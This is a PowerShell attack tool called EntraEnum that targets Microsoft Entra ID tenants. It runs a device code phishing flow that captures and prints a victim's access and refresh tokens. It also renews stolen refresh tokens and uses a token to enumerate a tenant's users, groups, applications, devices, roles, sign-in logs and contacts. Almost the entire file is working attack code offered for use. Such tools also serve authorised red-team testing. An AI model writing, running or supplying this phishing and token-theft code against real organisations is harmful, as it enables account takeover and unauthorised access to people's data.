function Invoke-EntraEnum {
    param(
        [Parameter(Mandatory = $false)]
        [string]$domain,

        [Parameter(Mandatory = $false)]
        [string]$AccessToken,

        [Parameter(Mandatory = $false)]
        [string]$RefreshToken,

        [switch]$users,
        [switch]$groups,
        [switch]$applications,
        [switch]$servicePrincipals,
        [switch]$devices,
        [switch]$roles,
        [switch]$signins,
        [switch]$subscriptions,
        [switch]$contacts,
        [switch]$devicecodephishing,
        [switch]$DeviceCodeResults
    )

    function Show-Banner {
        Write-Host "  _____       _             _____                       " -ForegroundColor Red
        Write-Host " | ____|_ __ | |_ _ __ __ _| ____|_ __  _   _ _ __ ___  " -ForegroundColor Red
        Write-Host " |  _| | '_ \| __| '__/ _`  |  _| | '_ \| | | | '_ \` _ \ " -ForegroundColor Yellow
        Write-Host " | |___| | | | |_| | | (_| | |___| | | | |_| | | | | | |" -ForegroundColor Yellow
        Write-Host " |_____|_| |_|\__|_|  \__,_|_____|_| |_|\__,_|_| |_| |_|" -ForegroundColor Red
        Write-Host ""
        Write-Host "	Fun With EntraID" -ForegroundColor Yellow
        Write-Host "	By @ShkudW" -ForegroundColor Yellow
        Write-Host "	https://github.com/ShkudW/EntraEnum" -ForegroundColor Yellow
        Write-Host ""
        Write-Host " ======================================================= " -ForegroundColor Green
    }

    Show-Banner

    function Show-Usage {
        Write-Host "Usage:" -ForegroundColor Yellow
        Write-Host "----------------------" -ForegroundColor Yellow
        Write-Host "----------------------" -ForegroundColor Yellow
        Write-Host ""
        Write-Host " -domain <domain>                  : Specify the domain to retrieve the Tenant ID" -ForegroundColor Cyan
        Write-Host ""
        Write-Host " -AccessToken <token>              : Provide an Access Token for API calls, Only with '-domain' flag" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "Flags with -AccessToken flag:" -ForegroundColor Green
        Write-Host "------------------------------------------" -ForegroundColor Green
        Write-Host "  -users                           : List all users in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -groups                          : List all groups in the domain, Only with '-AccessToken' flags" -ForegroundColor Magenta
        Write-Host "  -applications                    : List all applications in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -servicePrincipals               : List all service principals in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -devices                         : List all devices in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -roles                           : List all roles in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -signins                         : List recent sign-ins for the domain, Only with '-AccessToken' flag' flags" -ForegroundColor Magenta
        Write-Host "  -subscriptions                   : List all subscriptions in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host "  -contacts                        : List all contacts in the domain, Only with '-AccessToken' flag" -ForegroundColor Magenta
        Write-Host ""
        Write-Host "Device Code Phishing Attack:" -ForegroundColor Green
        Write-Host "---------------------------"  -ForegroundColor Green
        Write-Host " -devicecodephishing              : Start a device code phishing session" -ForegroundColor blue
        Write-Host " -DeviceCodeResults               : Retrieve Access and Refresh Tokens from the device code" -ForegroundColor blue
        Write-Host ""
        Write-Host "Using Refresh token to receive new Access and Refresh Tokens:" -ForegroundColor Green
        Write-Host "------------------------------------------------------------" -ForegroundColor Green
        Write-Host " -RefreshToken <token>             : Provide a Refresh Token to get a new Access Token, Need '-domain' flag" -ForegroundColor blue
    }

    
    function Get-TenantID {
        param (
            [string]$domain
        )
        $url = "https://login.microsoftonline.com/$domain/v2.0/.well-known/openid-configuration"
        try {
            $response = Invoke-RestMethod -Uri $url -Method Get
            $tenantID = $response.issuer -replace "https://login.microsoftonline.com/", "" -replace "/v2.0", ""
            Write-Host "Tenant ID: $tenantID" -ForegroundColor Green
            return $tenantID
        } catch {
            Write-Host "Domain not found. Please check the domain name." -ForegroundColor Red
            return $null
        }
    }

    
    if ($domain -and (-not $AccessToken -and -not $RefreshToken -and -not $users -and -not $groups -and -not $applications -and -not $servicePrincipals -and -not $devices -and -not $roles -and -not $signins -and -not $subscriptions -and -not $contacts -and -not $devicecodephishing -and -not $DeviceCodeResults)) {
        $tenantID = Get-TenantID -domain $domain
        if (-not $tenantID) {
            Write-Host "No valid Tenant ID found for the domain '$domain'." -ForegroundColor Red
        }
        return
    }

    # Check if no flags are provided
    if (-not $domain -and -not $AccessToken -and -not $RefreshToken -and -not $users -and -not $groups -and -not $applications -and -not $servicePrincipals -and -not $devices -and -not $roles -and -not $signins -and -not $subscriptions -and -not $contacts -and -not $devicecodephishing -and -not $DeviceCodeResults) {
        Show-Usage
        return
    }

    # Handle Device Code Phishing
    if ($devicecodephishing) {
        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        $Scope = ".default offline_access"
        $body = @{
            "client_id" = $ClientID
            "scope" = $Scope
        }

        $authResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
        $deviceCodeFile = "$env:TEMP\device_code.json"
        $authResponse | ConvertTo-Json | Set-Content -Path $deviceCodeFile

        Write-Host "Device code for phishing:" -ForegroundColor Cyan
        Write-Host "-------------------------" -ForegroundColor Cyan
        Write-Host "Please visit: $($authResponse.verification_uri)" -ForegroundColor Green
        Write-Host "Enter this code: $($authResponse.user_code)" -ForegroundColor Green
        return
    }

    # Handle Device Code Results
    if ($DeviceCodeResults) {
        $deviceCodeFile = "$env:TEMP\device_code.json"

        if (-not (Test-Path -Path $deviceCodeFile)) {
            Write-Host "Error: No device code found. Please run -devicecodephishing to generate a code." -ForegroundColor Red
            return
        }

        $authResponse = Get-Content -Path $deviceCodeFile -Raw | ConvertFrom-Json

        $body = @{
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "device_code" = $authResponse.device_code
        }

        while ($true) {
            try {
                $TokenResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction Stop

                Write-Host "Access Token:" -ForegroundColor Cyan
                Write-Host "-------------" -ForegroundColor Cyan
                Write-Host $TokenResponse.access_token -ForegroundColor Green
                Write-Host "Refresh Token:" -ForegroundColor Yellow
                Write-Host "--------------" -ForegroundColor Yellow
                Write-Host $TokenResponse.refresh_token -ForegroundColor Green

                Remove-Item -Path $deviceCodeFile -Force
                break
            } catch {
                if ($_.Exception.Response.StatusCode.Value__ -eq 400 -and $_.Exception.Response.StatusDescription -like "*authorization_pending*") {
                    Write-Host "Waiting for authorization... polling for Access Token." -ForegroundColor Yellow
                    Start-Sleep -Seconds 5
                } else {
                    Write-Host "An unexpected error occurred: $($_.Exception.Message)" -ForegroundColor Red
                    break
                }
            }
        }
        return
    }

    # Handle Refresh Token
    if ($RefreshToken) {
        if (-not $domain) {
            Write-Host "Error: Domain is required when using -RefreshToken flag." -ForegroundColor Red
            return
        }

        $tenantID = Get-TenantID -domain $domain

        if (-not $tenantID) {
            Write-Host "No valid Tenant ID found for the domain '$domain'." -ForegroundColor Red
            return
        }

        # Prepare body for the token request
        $body = @{
            "client_id"    = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type"   = "refresh_token"
            "scope"        = "openid"
            "resource"     = "https://graph.microsoft.com/"
            "refresh_token" = $RefreshToken
        }

        $tokenUrl = "https://login.microsoftonline.com/$tenantID/oauth2/token?api-version=1.0"

        # Send request to get new tokens
        try {
            $TokenResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri $tokenUrl -Body $body
            Write-Host "Access Token:" -ForegroundColor Cyan
            Write-Host "-------------" -ForegroundColor Cyan
            Write-Host $TokenResponse.access_token -ForegroundColor Green
            Write-Host "Refresh Token:" -ForegroundColor Yellow
            Write-Host "--------------" -ForegroundColor Yellow
            Write-Host $TokenResponse.refresh_token -ForegroundColor Green
        } catch {
            Write-Host "Failed to retrieve tokens. Please check the provided refresh token and domain." -ForegroundColor Red
        }
        return
    }

    # API calls using Access Token
    if ($AccessToken) {
        function Call-MicrosoftGraphAPI {
            param (
                [string]$url,
                [string]$AccessToken
            )
            try {
                $headers = @{
                    "Authorization" = "Bearer $AccessToken"
                }
                $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
                return $response
            } catch {
                Write-Host "API call failed: $($_.Exception.Message)" -ForegroundColor Red
                return $null
            }
        }

        # Handle users
        if ($users) {
            $usersUrl = "https://graph.microsoft.com/v1.0/users"
            Write-Host "Users:" -ForegroundColor Cyan
            Write-Host "------" -ForegroundColor Cyan
            $usersResponse = Call-MicrosoftGraphAPI -url $usersUrl -AccessToken $AccessToken
            if ($usersResponse.value) {
                $usersResponse.value | ForEach-Object {
                    Write-Host "User: $($_.displayName), ID: $($_.id), Email: $($_.mail)" -ForegroundColor Green
                }
            } else {
                Write-Host "No users found." -ForegroundColor Yellow
            }
        }

        # Handle groups
        if ($groups) {
            $groupsUrl = "https://graph.microsoft.com/v1.0/groups"
            Write-Host "Groups:" -ForegroundColor Cyan
            Write-Host "------" -ForegroundColor Cyan
            $groupsResponse = Call-MicrosoftGraphAPI -url $groupsUrl -AccessToken $AccessToken
            if ($groupsResponse.value) {
                $groupsResponse.value | ForEach-Object {
                    Write-Host "Group: $($_.displayName), ID: $($_.id)" -ForegroundColor Green
                }
            } else {
                Write-Host "No groups found." -ForegroundColor Yellow
            }
        }

        # Handle applications
        if ($applications) {
            $applicationsUrl = "https://graph.microsoft.com/v1.0/applications"
            Write-Host "Applications:" -ForegroundColor Cyan
            Write-Host "-------------" -ForegroundColor Cyan
            $applicationsResponse = Call-MicrosoftGraphAPI -url $applicationsUrl -AccessToken $AccessToken
            if ($applicationsResponse.value) {
                $applicationsResponse.value | ForEach-Object {
                    Write-Host "Application: $($_.displayName), ID: $($_.id)" -ForegroundColor Green
                }
            } else {
                Write-Host "No applications found." -ForegroundColor Yellow
            }
        }

        # Handle servicePrincipals
        if ($servicePrincipals) {
            $servicePrincipalsUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
            Write-Host "Service Principals:" -ForegroundColor Cyan
            Write-Host "------------------" -ForegroundColor Cyan
            $servicePrincipalsResponse = Call-MicrosoftGraphAPI -url $servicePrincipalsUrl -AccessToken $AccessToken
            if ($servicePrincipalsResponse.value) {
                $servicePrincipalsResponse.value | ForEach-Object {
                    Write-Host "Service Principal: $($_.displayName), ID: $($_.id)" -ForegroundColor Green
                }
            } else {
                Write-Host "No service principals found." -ForegroundColor Yellow
            }
        }

        # Handle devices
        if ($devices) {
            $devicesUrl = "https://graph.microsoft.com/v1.0/devices"
            Write-Host "Devices:" -ForegroundColor Cyan
            Write-Host "------" -ForegroundColor Cyan
            $devicesResponse = Call-MicrosoftGraphAPI -url $devicesUrl -AccessToken $AccessToken
            if ($devicesResponse.value) {
                $devicesResponse.value | ForEach-Object {
                    Write-Host "Device: $($_.displayName), ID: $($_.id)" -ForegroundColor Green
                }
            } else {
                Write-Host "No devices found." -ForegroundColor Yellow
            }
        }

        # Handle roles
        if ($roles) {
            $rolesUrl = "https://graph.microsoft.com/v1.0/directoryRoles"
            Write-Host "Roles:" -ForegroundColor Cyan
            Write-Host "------" -ForegroundColor Cyan
            $rolesResponse = Call-MicrosoftGraphAPI -url $rolesUrl -AccessToken $AccessToken
            if ($rolesResponse.value) {
                $rolesResponse.value | ForEach-Object {
                    Write-Host "Role: $($_.displayName), ID: $($_.id)" -ForegroundColor Green
                }
            } else {
                Write-Host "No roles found." -ForegroundColor Yellow
            }
        }

        # Handle sign-ins
        if ($signins) {
            $signinsUrl = "https://graph.microsoft.com/v1.0/auditLogs/signIns"
            Write-Host "Sign-ins:" -ForegroundColor Cyan
            Write-Host "--------" -ForegroundColor Cyan
            $signinsResponse = Call-MicrosoftGraphAPI -url $signinsUrl -AccessToken $AccessToken
            if ($signinsResponse.value) {
                $signinsResponse.value | ForEach-Object {
                    Write-Host "Sign-in: $($_.userDisplayName), Status: $($_.status.errorCode), Date: $($_.createdDateTime)" -ForegroundColor Green
                }
            } else {
                Write-Host "No sign-ins found." -ForegroundColor Yellow
            }
        }

        # Handle subscriptions
        if ($subscriptions) {
            $subscriptionsUrl = "https://graph.microsoft.com/v1.0/subscriptions"
            Write-Host "Subscriptions:" -ForegroundColor Cyan
            Write-Host "--------------" -ForegroundColor Cyan
            $subscriptionsResponse = Call-MicrosoftGraphAPI -url $subscriptionsUrl -AccessToken $AccessToken
            if ($subscriptionsResponse.value) {
                $subscriptionsResponse.value | ForEach-Object {
                    Write-Host "Subscription: $($_.resource), Expiration: $($_.expirationDateTime)" -ForegroundColor Green
                }
            } else {
                Write-Host "No subscriptions found." -ForegroundColor Yellow
            }
        }

        # Handle contacts
        if ($contacts) {
            $contactsUrl = "https://graph.microsoft.com/v1.0/contacts"
            Write-Host "Contacts:" -ForegroundColor Cyan
            Write-Host "--------" -ForegroundColor Cyan
            $contactsResponse = Call-MicrosoftGraphAPI -url $contactsUrl -AccessToken $AccessToken
            if ($contactsResponse.value) {
                $contactsResponse.value | ForEach-Object {
                    Write-Host "Contact: $($_.displayName), Email: $($_.mail)" -ForegroundColor Green
                }
            } else {
                Write-Host "No contacts found." -ForegroundColor Yellow
            }
        }

    } else {
        Write-Host "Access Token not provided. Please provide an access token for API calls." -ForegroundColor Red
    }
}
